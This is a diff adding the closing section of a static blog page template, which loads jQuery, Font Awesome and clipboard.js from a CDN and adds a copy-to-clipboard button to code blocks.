+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+
+<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
